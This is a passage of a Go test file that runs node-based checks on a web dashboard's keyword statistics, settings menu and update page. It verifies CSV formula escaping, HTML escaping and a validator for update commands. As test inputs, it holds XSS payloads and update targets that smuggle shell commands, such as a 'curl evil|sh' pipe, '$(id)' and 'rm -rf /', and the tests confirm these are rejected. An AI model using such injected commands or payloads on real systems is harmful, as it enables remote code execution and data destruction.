// statistics under node: a cell that starts like a formula gets an apostrophe, a hostile keyword is
// escaped in the cell and its tooltip, the empty keyword is captioned, and the ratio of the totals
// comes from the sums. It skips when node is absent.
func TestKeywordStatsLogic(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not found — skipping the keyword statistics checks")
	}
	html := spaSource()
	var src strings.Builder
	src.WriteString(spaBetween(html, "const esc=(s)=>", "\n") + "\n")
	src.WriteString("const tr=k=>k==='kws.tr.of'?'Trend: {key}':k; let KWS_DATA=null, KWS_TREND=new Map(), KWS_TREND_READY=true, ME=null, KWS={campaign: 'promo', conds: []}, KWS_Q='', KWS_PAGE=1000, KWS_PAGE_I=0, KWS_SORT={k:'',dir:-1};\n")
	src.WriteString("const trFill=(k,m)=>{let s=tr(k); Object.keys(m||{}).forEach(n=>{s=s.split('{'+n+'}').join(String(m[n]))}); return s};\n")
	src.WriteString(spaBetween(html, "const KWS_NEEDS_CONV=", "\n") + "\n")
	src.WriteString(spaBetween(html, "const KWS_COLS=", "\n") + "\n")
	src.WriteString("const rangeQS=()=>'from=A&to=B'; const condsQS=conds=>{const qs=new URLSearchParams(); conds.forEach(c=>(c.v||['']).forEach(v=>qs.append('f',c.f+':'+c.op+':'+v))); return qs};\n")
	src.WriteString("const fmt=n=>String(+n||0); const csvNum=n=>String(+n||0); const csvMoney=n=>(+n||0).toFixed(2); const moneyText=(n)=>(+n||0).toFixed(2)+' $';\n")
	src.WriteString("const cellRatio=(n,d)=>+d?((n/d)*100).toFixed(2)+'%':'0.00%';\n")
	for _, name := range []string{"csvSafe", "csvTable", "kwsKeyCell", "kwsCellText", "kwsSpark", "kwsSum", "kwsTrendCell", "kwsData", "kwsTrendMap", "hiddenFields", "hiddenCols", "kwsCols", "kwsCampaign", "kwsOriginAllowed", "kwsMode", "kwsPruneConds", "kwsQS", "kwsPageQS"} {
		fn := spaFunctionLine(html, name)
		if fn == "" {
			t.Fatalf("%s not found in SPA", name)
		}
		src.WriteString(fn + "\n")
	}
	src.WriteString(`
let failed = 0;
const eq = (got, want, what) => { if (got !== want) { failed++; console.log('FAIL ' + what + '\n  got  ' + JSON.stringify(got) + '\n  want ' + JSON.stringify(want)); } };

eq(csvTable(['a'], [['=1+1'], ['@x'], ['+1'], ['-1+1'], ['\r'], ['\tx'], ['plain text'], ['']]),
  "a\n'=1+1\n'@x\n'+1\n'-1+1\n\"'\r\"\n'\tx\nplain text\n", 'formula cells get an apostrophe, plain text and empty cells stay');
eq(csvSafe('-'), '-', 'a lone dash stays');
eq(csvSafe('-5'), '-5', 'a string that is a whole decimal number stays as it is');
eq(csvSafe('-5.00'), '-5.00', 'a money string with a minus stays as it is');
eq(csvSafe('-35.20%'), '-35.20%', 'a negative percent stays as it is');
eq(csvSafe('-1,234.50 $'), '-1,234.50 $', 'a negative formatted amount with a dollar sign stays as it is');
eq(csvSafe('-12.00 USD'), '-12.00 USD', 'a negative amount with a currency code stays as it is');
eq(csvSafe('-5 EUR'), '-5 EUR', 'a negative whole amount with a currency code stays as it is');
eq(csvSafe('1,234.50 $'), '1,234.50 $', 'a positive formatted amount is never touched');
eq(csvSafe('-1,234.50 $, 5 EUR'), "'-1,234.50 $, 5 EUR", 'a list of amounts is not one number and is escaped');
eq(csvSafe('-1+1%'), "'-1+1%", 'a formula that ends with a percent sign is escaped');
eq(csvSafe('-1\tUSD'), "'-1\tUSD", 'a tab inside is not a space and the cell is escaped');
eq(csvSafe('-'), '-', 'a lone dash stays');
eq(csvSafe('12.50'), '12.50', 'a money string keeps its zeros');
eq(csvSafe('-1+1'), "'-1+1", 'a minus before a formula is escaped');
eq(csvSafe('+1'), "'+1", 'a plus sign is escaped: only the minus is allowed');
eq(csvSafe('-.5'), "'-.5", 'a fraction without a leading digit is escaped');
eq(csvSafe('-5.'), "'-5.", 'a trailing dot is escaped');
eq(csvSafe('=1+1'), "'=1+1", 'an equals sign is escaped');
eq(csvSafe('@x'), "'@x", 'an at sign is escaped');
eq(csvSafe('\tx'), "'\tx", 'a tab is escaped');
eq(csvSafe(-5), '-5', 'a number -5 stays as it is');
eq(csvSafe(-0.5), '-0.5', 'a negative fraction stays as it is');
eq(csvSafe(NaN), 'NaN', 'a number that is not finite is still text');
eq(csvSafe(-Infinity), "'-Infinity", 'an infinite negative number is escaped as text');
eq(csvTable(['n', 's'], [[-5, '-5'], [12.5, '=1+1']]), "n,s\n-5,-5\n12.5,'=1+1", 'numbers and decimal strings pass, formulas are escaped in one table');
eq(csvSafe(0), '0', 'a number zero is text 0');
eq(csvSafe(null), '', 'null is an empty cell');
eq(csvTable(['x,y', 'q"r'], [['a,b', 'line\nbreak', 'cr\rbreak']]), '"x,y","q""r"\n"a,b","line\nbreak","cr\rbreak"', 'comma, quote, new line and carriage return are quoted');

const evil = '<img src=x onerror=alert(1)>';
let h = kwsKeyCell({keyword: evil});
eq(h.includes('<img'), false, 'a hostile keyword leaves no raw tag');
eq(h, '<span title="&lt;img src=x onerror=alert(1)&gt;">&lt;img src=x onerror=alert(1)&gt;</span>', 'the keyword is escaped in the text and in the tooltip');
h = kwsKeyCell({keyword: '"><script>x</script>'});
eq(h.includes('<script'), false, 'quotes and tags in a keyword are escaped');
eq((h.match(/"/g) || []).length, 2, 'a quote in a keyword cannot leave the title attribute');
eq(kwsKeyCell({keyword: ''}), '<span class="subtle">kws.nokey</span>', 'the empty keyword is captioned');
eq(kwsCellText({keyword: ''}, 'keyword', false), 'kws.nokey', 'the empty keyword is captioned in the export too');

KWS_DATA = {rows: [], truncated: false, ready: false};
eq(kwsCellText({conv: 3, hits: 10}, 'conv', false), '—', 'conversions are a dash while they are not ready');
eq(kwsCellText({conv: 3, hits: 10}, 'cr', true), '', 'a CSV cell is empty while conversions are not ready');
eq(kwsCellText({hits: 10}, 'hits', false), '10', 'clicks show without conversions');
KWS_DATA = {rows: [], truncated: false, ready: true};
eq(kwsCellText({conv: 3, hits: 10, unique: 7, rejected: 1, profit: 12.5}, 'cr', false), '30.00%', 'CR from conversions and clicks');
eq(kwsCellText({conv: 3, hits: 0}, 'cr', false), '—', 'CR without clicks is a dash');
eq(kwsCellText({conv: 3, hits: 0}, 'cr', true), '', 'CR without clicks is an empty CSV cell');
eq(kwsCellText(kwsData({rows: [], total: 2, totals: {hits: 0, conv: 3}}).totals, 'cr', false), '—', 'the total CR is a dash while the clicks add up to zero');
eq(kwsCellText({unique: 7}, 'uniq', false), '7', 'unique reads the unique field');
eq(kwsCellText({rejected: 1}, 'rej', false), '1', 'rejected reads the rejected field');
eq(kwsCellText({profit: -5}, 'revenue', true), '-5.00', 'a negative amount keeps its sign in the machine text');
eq(kwsCellText({profit: 12.5}, 'revenue', false), '12.50 $', 'the revenue column reads the profit field of the row');
eq(KWS_NEEDS_CONV.has('revenue') && !KWS_NEEDS_CONV.has('profit'), true, 'revenue needs the conversions, the old profit id is gone');

const colIds = me => { ME = me; return kwsCols().map(c => c.id).join(','); };
eq(colIds(null), 'keyword,hits,uniq,conv,leads,sales,rej,cr,revenue,trend', 'a full role sees every column');
eq(colIds({hidden: ['cost']}), 'keyword,hits,uniq,conv,leads,sales,rej,cr,revenue,trend', 'a hidden cost keeps the revenue column');
eq(colIds({hidden: ['profit']}), 'keyword,hits,uniq,conv,leads,sales,rej,cr,trend', 'a hidden profit removes revenue');
eq(colIds({hidden: ['status']}), 'keyword,hits,uniq,conv,cr,revenue,trend', 'a hidden status removes leads, sales and rejected');

ME = null;
eq(kwsCampaign(), 'promo', 'the saved campaign is used');
eq(kwsQS().includes('f=campaign_id%3Aeq%3Apromo'), true, 'the campaign goes to the query as a campaign_id filter');
ME = {hidden: ['campaign_id']};
eq(kwsCampaign(), '', 'a role without campaign_id ignores the saved campaign');
eq(kwsQS().includes('campaign_id'), false, 'a role without campaign_id sends no campaign_id filter');
KWS.conds = [{f: 'campaign_id', op: 'eq', v: ['x']}, {f: 'country', op: 'eq', v: ['PL']}];
kwsPruneConds();
eq(JSON.stringify(KWS.conds.map(c => c.f)), '["country"]', 'a saved condition on a hidden field is dropped from the list the chips are drawn from');
eq(kwsQS().includes('campaign_id'), false, 'the query has no condition on a hidden field');
eq(kwsQS().includes('country'), true, 'other saved conditions stay');
ME = null; KWS.conds = [{f: 'country', op: 'eq', v: ['PL']}]; kwsPruneConds();
eq(KWS.conds.length, 1, 'a full role keeps every condition');
ME = {hidden: ['campaign_id']};
KWS_Q = 'buy';
eq(kwsQS().includes('f=keyword%3Acontains%3Abuy'), true, 'the search goes to the query as a keyword filter');
ME = null; KWS.conds = []; KWS_Q = '';
eq(kwsMode(), '', 'last click is the default attribution');
eq(kwsQS().includes('by=origin'), false, 'the default query does not ask for origin attribution');
KWS.by = 'origin';
eq(kwsMode(), 'origin', 'origin attribution is active for a full role');
eq(kwsQS().includes('by=origin'), true, 'origin attribution goes to the query');
ME = {hidden: ['origin_campaign_id']};
eq(kwsMode(), '', 'a role without the origin campaign cannot select origin attribution');
eq(kwsQS().includes('by=origin'), false, 'a hidden origin campaign sends no by=origin');
ME = null; KWS.by = '';

const page = kwsData({rows: [{keyword: 7, hits: 10, conv: 5, profit: 1}], total: 1200, totals: {hits: 100, conv: 10, profit: 3.5}, truncated: false, conv_ready: true});
const tot = page.totals;
eq(JSON.stringify([tot.hits, tot.conv, tot.profit, tot.unique, tot.keyword]), '[100,10,3.5,0,""]', 'the totals of the whole set come from the server, missing sums are zero');
eq(kwsCellText(tot, 'cr', false), '10.00%', 'the total ratio comes from the sums, not from the row ratios');
eq(JSON.stringify([page.total, page.rows[0].keyword, page.ready]), '[1200,"7",true]', 'the size of the set is kept and keywords become text');
eq(kwsData(null).total, 0, 'no body gives an empty set');
KWS_PAGE = 500; KWS_PAGE_I = 2; KWS_SORT = {k: 'cr', dir: 1};
let pq = new URLSearchParams(kwsPageQS());
eq([pq.get('limit'), pq.get('offset'), pq.get('sort'), pq.get('dir')].join(','), '500,1000,cr,asc', 'the page query has the window and the sort');
pq = new URLSearchParams(kwsPageQS(100000, 0));
eq([pq.get('limit'), pq.get('offset')].join(','), '100000,0', 'the export asks for the whole set from the start');
KWS_SORT = {k: '', dir: -1};
eq(new URLSearchParams(kwsPageQS()).has('sort'), false, 'no chosen column keeps the server order');
KWS_PAGE = 1000; KWS_PAGE_I = 0;

const sp = kwsSpark([1, 3, 2]);
eq(sp.startsWith('<svg class="kws-spark"') && sp.includes('<path d="M'), true, 'a series draws a line');
eq(kwsSpark([4]).includes('<circle'), true, 'a single day draws a dot');
eq(kwsSpark([0, 0, 0]).includes('NaN'), false, 'an all-zero series has no NaN');
eq(kwsSpark([]), '', 'an empty series draws nothing');
eq(kwsSum([1, 2, 3]) + kwsSum(null), 6, 'series sum');

const m = kwsTrendMap({days: ['2026-10-01', '2026-10-02'], series: [{keyword: evil, hits: [4, 6], conv: null}, {keyword: 'b', hits: [1, 1], conv: [0, 1], profit: [0, 2.5]}, {keyword: 'no-hits'}]});
eq(m.size, 2, 'a series without clicks is skipped');
eq(m.get(evil).conv, null, 'a missing conv array stays null');
KWS_DATA = {rows: [], truncated: false, ready: true};
KWS_TREND = m;
h = kwsTrendCell({keyword: evil}, new Set());
eq(h.includes('<img'), false, 'the trend cell has no raw tag');
eq(h.startsWith('<button type="button" class="kws-trend" data-kwtrend="&lt;img src=x onerror=alert(1)&gt;"'), true, 'the trend cell is a button that names its keyword, escaped');
eq(h.includes(' title="kws.col.hits: 10'), true, 'the trend button carries the sums tooltip');
eq(h.includes('aria-label="Trend: &lt;img src=x onerror=alert(1)&gt;"'), true, 'the trend button is labelled with the keyword, escaped');
eq(h.includes('aria-haspopup="dialog"'), true, 'the trend button says it opens a dialog');
KWS_TREND.set('', {hits: [1], conv: null, profit: null});
eq(kwsTrendCell({keyword: ''}, new Set()).includes('aria-label="Trend: kws.nokey"'), true, 'the empty keyword is captioned in the button label');
KWS_TREND.delete('');
eq(h.includes('kws.col.hits: 10'), true, 'the tooltip sum equals the clicks of the series');
eq(h.includes('kws.col.conv: —'), true, 'a missing conv series is a dash');
eq(kwsTrendCell({keyword: 'b'}, hiddenCols({hidden: ['profit']})).includes('col.revenue'), false, 'a hidden profit removes the revenue from the tooltip');
eq(kwsTrendCell({keyword: 'b'}, hiddenCols({hidden: ['cost']})).includes('col.revenue: 2.50 $'), true, 'a hidden cost keeps the revenue in the tooltip');
eq(kwsTrendCell({keyword: 'b'}, new Set()).includes('col.revenue: 2.50 $'), true, 'revenue sum in the tooltip');
eq(kwsTrendCell({keyword: 'other'}, new Set()), '', 'a keyword outside the leading rows has an empty trend cell');
KWS_DATA.ready = false;
eq(kwsTrendCell({keyword: 'b'}, new Set()).includes('kws.col.conv: —'), true, 'conversions are a dash in the tooltip while not ready');
if (failed) process.exit(1);
`)
	f := filepath.Join(t.TempDir(), "keywords.js")
	if err := os.WriteFile(f, []byte(src.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(node, f).CombinedOutput(); err != nil {
		t.Errorf("keyword statistics checks failed:\n%s", out)
	}
}

// spaTopFunction returns the source of one top-level SPA function: from its declaration to the closing brace at the start of a line,
// or just the declaration line for a one-line function.
// html is the SPA source, name the function name, async selects "async function" over "function".
// It returns "" when the declaration is not found.
func spaTopFunction(html, name string, async bool) string {
	open := "function " + name + "("
	if async {
		open = "async " + open
	}
	i := strings.Index(html, open)
	if i < 0 {
		return ""
	}
	rest := html[i:]
	if nl := strings.Index(rest, "\n"); nl >= 0 && strings.HasSuffix(rest[:nl], "}") && !strings.HasSuffix(rest[:nl], "{") && strings.Contains(rest[:nl], "){") {
		return rest[:nl]
	}
	if end := strings.Index(rest, "\n}\n"); end >= 0 {
		return rest[:end+2]
	}
	return rest
}

// spaConstLine returns the SPA line that starts with prefix, or "" when there is none.
// html is the SPA source and prefix the start of the line, for example "const esc=".
func spaConstLine(html, prefix string) string {
	i := strings.Index(html, "\n"+prefix)
	if i < 0 {
		return ""
	}
	rest := html[i+1:]
	if nl := strings.Index(rest, "\n"); nl >= 0 {
		return rest[:nl]
	}
	return rest
}

// settingsAboutChecks are the assertions of TestSettingsTabsAndAbout: the user menu entries equal the settings tabs for
// every kind of account, the old updates address leads to the about tab, the about page draws no alarm without a signature
// policy, prints "what's new" only through esc, and draws only the server fields that arrived.
const settingsAboutChecks = `
let failed = 0;
const eq = (got, want, what) => {
  const g = JSON.stringify(got), w = JSON.stringify(want);
  if (g !== w) { failed++; console.log('FAIL ' + what + '\n  got  ' + g + '\n  want ' + w); }
};
const yes = (cond, what) => { if (!cond) { failed++; console.log('FAIL ' + what); } };

const TAB_KEYS = ['menu.settings', 'prof.users', 'prof.keys', 'board.settings', 'about.tab'];
const menuLabels = () => userMenuItems('u').filter(i => i.label).map(i => i.label);
const tabButtons = (html) => [...html.matchAll(/data-ptab="([a-z]+)"[^>]*>([^<]*)</g)].map(m => [m[1], m[2]]);

// The menu lists the tab entries in the tab order, with the tab captions, for each kind of account.
const accounts = {
  admin: {type:'ADMIN', admin:true},
  keysAndUsers: {type:'USER', access:{}, pages:['settings', 'api_keys', 'users']},
  usersOnly: {type:'USER', access:{}, pages:['settings', 'users']},
  plain: {type:'USER', access:{}, pages:['settings']},
};
const want = {
  admin: TAB_KEYS,
  keysAndUsers: ['menu.settings', 'prof.users', 'prof.keys'],
  usersOnly: ['menu.settings', 'prof.users'],
  plain: ['menu.settings'],
};
const opened = [];
let replaced = '', wentTo = [], settingsDrawn = 0;
const VIEW = {innerHTML: ''};
view = () => VIEW;
history = {replaceState: (a, b, url) => { replaced = url; }};
go = (p) => { wentTo.push(p); };
settings = () => { settingsDrawn++; };
boardsPage = async () => { opened.push('boards'); };
usersPage = async () => { opened.push('users'); };
apiKeys = async () => { opened.push('keys'); };
const realAbout = aboutPage;
aboutPage = async () => { opened.push('about'); };
(async () => {
  for (const name of Object.keys(accounts)) {
    ME = accounts[name];
    const menuTabs = menuLabels().filter(l => TAB_KEYS.includes(l));
    eq(menuTabs, want[name], 'menu entries of ' + name + ' follow the tab list');
    await profile('');
    const tabs = tabButtons(VIEW.innerHTML);
    eq(tabs.map(t => t[1]), want[name], 'tab captions of ' + name + ' equal the menu captions');
    eq(menuTabs, tabs.map(t => t[1]), 'menu and tabs are one list for ' + name);
    yes(VIEW.innerHTML.includes('<h1>menu.settings</h1>'), 'the heading is the settings caption for ' + name);
  }
  const icons = userMenuItems('u').filter(i => i.label && TAB_KEYS.includes(i.label)).map(i => i.icon);
  eq(icons, settingsTabsAllowed().map(t => t.icon), 'menu icons come from the tabs');
  eq(settingsTabs().map(t => [t.id, t.key, t.route]), [
    ['profile', 'menu.settings', 'settings'], ['users', 'prof.users', 'settings/users'], ['keys', 'prof.keys', 'settings/keys'],
    ['boards', 'board.settings', 'settings/boards'], ['about', 'about.tab', 'settings/about']], 'the tab list');

  // The administrator block of the menu: the order of the list, a separator before the postbacks and before the about entry.
  const adminBlock = (me) => { ME = me; return adminMenuEntries().map(i => i === '-' ? '-' : i.label); };
  eq(adminBlock(accounts.admin), ['menu.settings', 'prof.users', 'menu.integrations', 'prof.keys', 'board.settings', '-', 'pb.title', '-', 'about.tab'], 'the administrator menu order');
  eq(adminBlock(accounts.plain), ['menu.settings'], 'a plain account has one entry and no separators');
  eq(adminBlock({type: 'USER', access: {}, pages: ['settings', 'conversions']}), ['menu.settings', '-', 'pb.title'], 'a lone postbacks entry keeps one separator and drops the trailing one');
  ME = accounts.admin;
  const postbackEntry = adminMenuEntries().find(i => i.label === 'pb.title');
  yes(postbackEntry && postbackEntry.on === SETTINGS_TABS.find(t => t.id === 'postbacks').open, 'the postbacks entry calls openPostbacks');
  wentTo = []; adminMenuEntries().find(i => i.label === 'menu.integrations').on();
  eq(wentTo, ['integrations'], 'the integrations entry opens the integrations page');

  // The "About" entry carries the one mark of the header: red alert for a failed service, yellow download for a newer commit.
  const aboutEntry = () => { const i = adminMenuEntries().find(e => e.label === 'about.tab'); return [i.icon, i.iconCls || '']; };
  SIG.data = {update:false, down:[]};
  eq(aboutEntry(), ['info', ''], 'no mark: the about entry keeps its icon');
  SIG.data = {update:true, down:[]};
  eq([aboutEntry(), sigMark()], [['download', 'sig-warn'], 'update'], 'a newer commit: yellow download on the about entry');
  SIG.data = {update:true, down:['clickhouse', 'redis']};
  eq([aboutEntry(), sigMark(), sigNames(SIG.data.down)], [['alert', 'sig-bad'], 'down', 'sig.svc.clickhouse, sig.svc.redis'], 'a failure wins over the update');
  SIG.data = {update:false, down:[]};

  // The environment of each build: Production only for env production, Development locally, nothing for an old process.
  yes(buildLabelHTML({version:'v1', env:'production'}).includes('<span class="pill ok">about.env.production</span>'), 'production is marked');
  yes(buildLabelHTML({version:'v1', env:'development'}).includes('<span class="pill">about.env.development</span>'), 'development is not production');
  yes(!buildLabelHTML({version:'v1'}).includes('about.env'), 'no env, no mark');
  ME = accounts.admin; opened.length = 0; settingsDrawn = 0; await profile('integrations');
  eq([opened, settingsDrawn], [[], 1], 'a menu-only entry is not a tab address');

  // The version line of the menu opens the about tab.
  ME = accounts.admin;
  UPD_VER = {admin: {version: 'v1', commit: 'abcdef0123456789'}};
  const verItem = userMenuItems('u').find(i => i.cap && i.cap.includes('upd.version'));
  yes(!!verItem, 'the version line is in the admin menu');
  wentTo = []; verItem.on();
  eq(wentTo, ['settings/about'], 'the version line leads to the about tab');
  UPD_VER = null;

  // Tab routing: the old updates address is the about tab, a tab without the right leads back, an unknown one is the settings tab.
  ME = accounts.admin; opened.length = 0; wentTo = []; replaced = '';
  await profile('updates');
  eq([opened, replaced, wentTo], [['about'], '#/settings/about', []], 'updates is the about tab and the address is rewritten');
  yes(VIEW.innerHTML.includes('data-ptab="about" aria-selected="true"'), 'the about tab is the selected one');
  opened.length = 0; await profile('users'); await profile('keys'); await profile('boards');
  eq(opened, ['users', 'keys', 'boards'], 'tabs open their pages');
  opened.length = 0; settingsDrawn = 0; await profile('bogus');
  eq([opened, settingsDrawn], [[], 1], 'an unknown tab draws the settings tab');
  ME = accounts.plain; opened.length = 0; wentTo = [];
  await profile('about'); await profile('users'); await profile('keys'); await profile('boards'); await profile('updates');
  eq([opened, wentTo], [[], ['settings', 'settings', 'settings', 'settings', 'settings']], 'a user without the right is led back to settings');

  // The section switcher adds nothing without a second section and no settings entry in any case.
  ME = accounts.admin; BOARDS = {loaded: false};
  const noBoards = []; appendBoardUserMenuItems(noBoards);
  eq(noBoards, [], 'no switcher rows with only the default section');

  // The setup form: the token field only when required, and the 403 answer has its own text.
  eq(setupTokenFieldHTML(false), '', 'no token field when no token is required');
  const field = setupTokenFieldHTML(true);
  yes(field.includes('id="su-t"') && field.includes('setup.token.hint'), 'the token field has an id and a hint');
  eq(setupMessage({status: 403, message: 'setup token is required'}), 'setup.token.bad', 'a missing token is explained');
  eq(setupMessage({status: 403, message: 'setup token is wrong'}), 'setup.token.bad', 'a wrong token is explained');
  eq(setupMessage({status: 400, message: 'bad'}), 'setup.bad', 'other answers keep their text');

  // Helpers of the about page.
  const sha = 'a'.repeat(40);
  eq(changelogURL('https://github.com/owner/repo.git', sha), 'https://github.com/owner/repo/blob/' + sha + '/CHANGELOG.md', 'the .git suffix is dropped');
  eq(changelogURL('https://github.com/owner/repo', sha), 'https://github.com/owner/repo/blob/' + sha + '/CHANGELOG.md', 'a plain address works');
  for (const bad of ['http://github.com/o/r.git', 'https://example.com/o/r.git', 'https://u:p@github.com/o/r.git', 'https://github.com/o/..', 'https://github.com/o/r/x', 'git@github.com:o/r.git', '']) eq(changelogURL(bad, sha), '', 'no link for ' + bad);
  eq([changelogURL('https://github.com/o/r', 'abc'), changelogURL('https://github.com/o/r', sha.toUpperCase())], ['', ''], 'only a full lower-case sha makes a link');
  eq([0, 45, 3600, 90061, 86700].map(durationText), ['0 s', '45 s', '1 h', '1 d 1 h', '1 d'], 'durations show the two largest units');
  eq(updSignBadge(false, '', false), '', 'no badge for an unsigned target without a policy');
  yes(updSignBadge(false, '', true).includes('upd.unsigned'), 'a required signature is flagged');
  yes(updSignBadge(true, 'Bob', false).includes('upd.signed: Bob'), 'a signed target names the signer');
  const U = 'sudo /usr/local/lib/emtds/update.sh';
  eq(schemaOkCommand([U + ' --check', U + ' --to abcdef0', U + ' --rollback']), U + ' --to abcdef0 --schema-ok', 'the exact command with --schema-ok');
  eq(schemaOkCommand([U + ' --to v1.2.3 --unsigned']), U + ' --to v1.2.3 --unsigned --schema-ok', 'the flags stay in the line');
  eq(schemaOkCommand([U + ' --check']), '', 'no --to command, no line');
  const evil = ['abcdef0; curl evil|sh #', '$(id)', 'abcdef0 def', 'abc\nrm -rf /', '', 'ABCDEF1', 'abc --schema-ok --schema-ok', '../x', 'abcdef0 && id', 'abcdef0 --bogus'];
  for (const tail of evil) {
    eq(schemaOkCommand([U + ' --to ' + tail]), '', 'no --schema-ok line for the target "' + tail + '"');
    eq(safeCLI([U + ' --to ' + tail]), [], 'the command with the target "' + tail + '" is dropped');
  }
  eq(safeCLI([U + ' --check; id', U + ' --channel --unsigned', 'sudo /tmp/update.sh --check', 'sudo  /usr/local/lib/emtds/update.sh --check', U + ' --to <sha>', 5, null, U + ' --rollback ']),
    [U + ' --channel --unsigned', U + ' --to <sha>'], 'only the expected commands survive');
  eq(safeCLI(null), [], 'no list, no commands');

  // The server rows: only what arrived.
  eq(systemRowsHTML(null, null), '', 'nothing arrived, no rows');
  eq(systemRowsHTML({host: {}, services: {}}, {}), '', 'empty groups, no rows');
  const onlyCPU = systemRowsHTML({host: {cpus: 4}}, null);
  yes(onlyCPU.includes('about.cpus') && !/about\.(load|mem|disk|uptime)/.test(onlyCPU) && !onlyCPU.includes('—'), 'one field gives one row and no dash rows');
  const full = systemRowsHTML({host: {cpus: 4, load: [0.12, 0.3, 0.25], mem_total: 8589934592, mem_available: 4294967296, uptime_s: 90061, disk_total: 107374182400, disk_free: 53687091200},
    services: {clickhouse: {state: 'ok', ms: 3}, redis: {state: 'not_configured'}, cron: {heartbeat_age_s: 12, busy: true}}}, {engine: {version: 'v1'}});
  yes(full.includes('0.12 / 0.30 / 0.25'), 'the load is three figures');
  yes(full.includes('4\u00a0GB free of 8\u00a0GB'), 'the memory is free of total: ' + full);
  yes(full.includes('50\u00a0GB free of 100\u00a0GB'), 'the disk is free of total');
  yes(full.includes('1 d 1 h'), 'the uptime is human');
  yes(full.includes('3 ms') && full.includes('Not configured') && full.includes('hb 12 s') && full.includes('about.busy'), 'the services show their state');
  yes(full.includes('<span class="pill ok">OK</span>'), 'the engine from /api/version is up');
  const noAvail = systemRowsHTML({host: {mem_total: 8589934592}}, null);
  yes(noAvail.includes('8\u00a0GB') && !noAvail.includes('free of'), 'a total without a free figure shows the total only');
  yes(systemRowsHTML(null, {engine_error: 'x'}).includes('pill bad'), 'an unreachable engine is flagged');
  eq(systemRowsHTML({services: {cron: {}}}, null), '', 'an empty cron group draws no row');

  // The about page.
  aboutPage = realAbout;
  const BODY = {innerHTML: ''}, SYSBOX = {innerHTML: ''}, REFBTN = {};
  q = (sel) => sel === '#profile-body' ? BODY : sel === '#about-sys-body' ? SYSBOX : sel === '#about-sys-refresh' ? REFBTN : null;
  qa = () => [];
  let sysCalls = 0, answers = {};
  get = async (path) => { if (path === '/api/system') sysCalls++; return path in answers ? answers[path] : null; };
  const cur = 'b'.repeat(40);
  const base = () => ({
    build: {version: 'v0.1.0', commit: sha, commit_date: '2026-11-01T10:00:00Z', channel: 'main'},
    agent: {repo: 'https://github.com/owner/repo.git', channel: 'main', signing: false, at: '2026-11-17T01:00:00Z'}, agent_fresh: true, inbox: true,
    check: {at: '2026-11-17T01:00:00Z', ahead: 2, current: {commit: sha}, target: {commit: cur, version: 'v0.2.0'}, signed: false, signer: '',
      commits: [{sha: cur, subject: 'subject <i>', author: 'a'}], notes: '<img src=x onerror=alert(1)>\n- line', manual_steps: ['run <b>x</b>']},
    state: null, can_apply: true, can_rollback: false, cli: [U + ' --check', U + ' --to ' + cur.slice(0, 12), U + ' --rollback'],
  });
  const verOK = {admin: {version: 'v0.1.0', commit: sha, commit_date: '2026-11-01T10:00:00Z', channel: 'main'}, engine: {version: 'v0.1.0', commit: sha}, cron: {version: 'v0.1.0', commit: sha}, mismatch: false};
  const sysOK = {host: {cpus: 4, mem_total: 8589934592, mem_available: 4294967296, uptime_s: 90061}, services: {redis: {state: 'ok', ms: 1}, clickhouse: {state: 'down'}}};

  answers = {'/api/update': base(), '/api/version': verOK, '/api/system': sysOK};
  await aboutPage();
  let html = BODY.innerHTML;
  yes(!html.includes('upd.unsigned'), 'no red badge without a signature policy');
  yes(html.includes('<span class="pill">upd.sign.off</span>'), 'the neutral signature-off plate');
  yes(html.includes('<pre class="notes">&lt;img src=x onerror=alert(1)&gt;'), 'what is new goes through esc');
  yes(!html.includes('<img') && !html.includes('<i>') && !html.includes('<b>x</b>'), 'no raw markup from the check data');
  yes(html.includes('&lt;b&gt;x&lt;/b&gt;'), 'a manual step goes through esc');
  yes(html.includes('<code>' + U + ' --to ' + cur.slice(0, 12) + ' --schema-ok</code>'), 'the exact command with --schema-ok');
  yes(html.includes('<code>' + U + ' --check</code>'), 'a valid command is printed');
  yes(html.includes('href="https://github.com/owner/repo/blob/' + sha + '/CHANGELOG.md"') && html.includes('rel="noopener noreferrer"'), 'the changelog link');
  yes(!html.includes('stale '), 'no stale warning when the check was made for this build');
  yes(html.includes('A(2026-11-17T01:00:00Z)'), 'the age of the check');
  yes(html.includes('W(2026-11-01T10:00:00Z)'), 'the build date');
  eq(sysCalls, 1, 'the server block is read once on opening');
  yes(SYSBOX.innerHTML.includes('about.cpus') && SYSBOX.innerHTML.includes('1 d 1 h') && SYSBOX.innerHTML.includes('1 ms'), 'the server rows that arrived');
  yes(!/about\.(load|disk)/.test(SYSBOX.innerHTML) && !SYSBOX.innerHTML.includes('—'), 'the server rows that did not arrive are not drawn');
  yes(SYSBOX.innerHTML.includes('<span class="pill bad">Down</span>'), 'a service that is down is flagged');
  await REFBTN.onclick();
  eq(sysCalls, 2, 'the server block reads again on its button');
  eq([...html.matchAll(/<section class="card pad upd-card" id="([a-z-]+)">/g)].map(m => m[1]), ['about-ver', 'about-upd', 'about-cli', 'about-sys'], 'four blocks in order');
  yes(html.includes('<div class="bt">about.update</div><div class="upd-tools"><button type="button" class="btn primary" id="upd-apply-btn"'), 'the update button stands at the right of its block title');
  yes(html.includes('<div class="bt">about.server</div><div class="upd-tools"><button type="button" class="btn secondary" id="about-sys-refresh"'), 'the server refresh stands at the right of its block title too');
  eq((html.match(/class="upd-tools"/g) || []).length, 2, 'only the update and server blocks carry buttons in the title');
  yes(html.includes('<div class="cli-row"><code>' + U + ' --check</code><button type="button" class="copy-ic icon sm ghost"'), 'the copy button sits in the command row');
  yes(html.includes('class="copy-ic icon sm ghost"') && html.includes('viewBox="0 0 24 24"'), 'the copy button is an icon, not a clipped glyph');
  yes(!html.includes('id="upd-prog"'), 'no progress block without a request');

  const stale = base(); stale.check.current = {commit: cur};
  answers = {'/api/update': stale, '/api/version': verOK, '/api/system': null};
  await aboutPage();
  yes(BODY.innerHTML.includes('stale ' + cur.slice(0, 12)), 'a check made for another build is flagged');
  yes(BODY.innerHTML.includes('id="upd-stale-check"') && !BODY.innerHTML.includes('upd.commits') && !BODY.innerHTML.includes('subject'), 'a stale check offers a check and hides its commits');
  yes(SYSBOX.innerHTML.includes('about.server.err'), 'an unreadable server block says so');
  const flagged = base(); flagged.check_stale = true;
  answers = {'/api/update': flagged, '/api/version': verOK, '/api/system': sysOK};
  await aboutPage();
  yes(BODY.innerHTML.includes('id="upd-stale-check"'), 'the server flag of a stale check is honoured');

  delete SESS['emtds-upd-track'];
